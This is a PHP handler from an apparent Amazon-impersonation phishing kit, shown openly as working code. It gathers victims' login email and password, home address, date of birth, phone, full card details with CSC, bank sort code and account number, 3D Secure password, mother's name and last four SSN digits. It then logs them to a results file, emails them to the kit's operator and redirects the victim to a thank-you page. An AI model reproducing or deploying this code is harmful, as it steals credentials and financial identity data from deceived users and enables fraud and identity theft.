<?php

session_start();

include('../__CONFIG__.php');

if (isset($_POST['Sex']))
{


$message=
"
	<!DOCTYPE html>
	<html>
	<head>
		<meta charset='UTF-8' />
	</head>
	<body>
	<style type='text/css'>
	body{
		background: #fff;
		color: #fff;
		font-family: arial;
	}
	.rezlt{
		width: 600px;
		border: 1px solid #232f3e;
	}
	table{
		width: 100%;
	    background: #fff;
	    color: #444;
	}
	table td{
		padding: 10px;
	}
	.newline{
    width: 100%;
    background: #ff9900;
    height: 2px;
	}
	</style>
	<center>
	<div class='rezlt'>
		<h3 style='text-align: center;background: #232f3e;margin: 0px;padding: 17px;'>Amazone [LOGIN - BILLING - CARD]</h3>
		<table>
			<tr>
				<td style='width: 200px;'><b>Full name</b></td>
				<td style='width: 400px;'>".$_SESSION['EM']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Login Password</b></td>
				<td style='width: 400px;'>".$_SESSION['PW']."</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>Full name</b></td>
				<td style='width: 400px;'>".$_SESSION['fullname']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Address line 1</b></td>
				<td style='width: 400px;'>".$_SESSION['address1']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Address line 2</b></td>
				<td style='width: 400px;'>".$_SESSION['address2']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>City</b></td>
				<td style='width: 400px;'>".$_SESSION['city']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>State</b></td>
				<td style='width: 400px;'>".$_SESSION['state']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Zip</b></td>
				<td style='width: 400px;'>".$_SESSION['zip']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Country</b></td>
				<td style='width: 400px;'>".$_SESSION['country']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Date of birth</b></td>
				<td style='width: 400px;'>".$_SESSION['dob']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Phone number</b></td>
				<td style='width: 400px;'>".$_SESSION['phone']."</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>Name on card</b></td>
				<td style='width: 400px;'>".$_SESSION['nameoncard']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Card number</b></td>
				<td style='width: 400px;'>".$_SESSION['ncn']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Experation date</b></td>
				<td style='width: 400px;'>".$_SESSION['month']."/".$_SESSION['year']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>CSC</b></td>
				<td style='width: 400px;'>".$_SESSION['cxxs']."</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>Sort Code</b></td>
				<td style='width: 400px;'>".@$_POST['sortcode']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>3D Secure</b></td>
				<td style='width: 400px;'>".@$_POST['password_vbv']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Account Number</b></td>
				<td style='width: 400px;'>".@$_POST['accountnum']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>OS ID</b></td>
				<td style='width: 400px;'>".@$_POST['osid']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Credit Limit</b></td>
				<td style='width: 400px;'>".@$_POST['creditlimit']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Mother Name</b></td>
				<td style='width: 400px;'>".@$_POST['mothernam']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Last 4 Ssn</b></td>
				<td style='width: 400px;'>".@$_POST['ssn']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Date OF Birth</b></td>
				<td style='width: 400px;'>".@$_POST['dob_day']."-".@$_POST['dob_month']."-".@$_POST['dob_year']."</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>IP</b></td>
				<td style='width: 400px;'><a href='http://geoiptool.com/?ip=".$_SERVER['REMOTE_ADDR']."' target='_blank'>".$_SERVER['REMOTE_ADDR']."</a></td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>User Agent</b></td>
				<td style='width: 400px;'>".$_SERVER['HTTP_USER_AGENT']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Accept Language</b></td>
				<td style='width: 400px;'>".$_SERVER['HTTP_ACCEPT_LANGUAGE']."</td>
			</tr>
		</table>
	</div>
	</center>
	</body>
	</html>
";
	$Txt_Rezlt = fopen('../../rezlt.html', 'a+');
	fwrite($Txt_Rezlt, $message);
	fclose($Txt_Rezlt);
	mail($to, $subject, $message, $headers);

	header('Location: ../Thanks.php?udm_cat_path='.sha1(time()));
}
else
{
	# code...
}
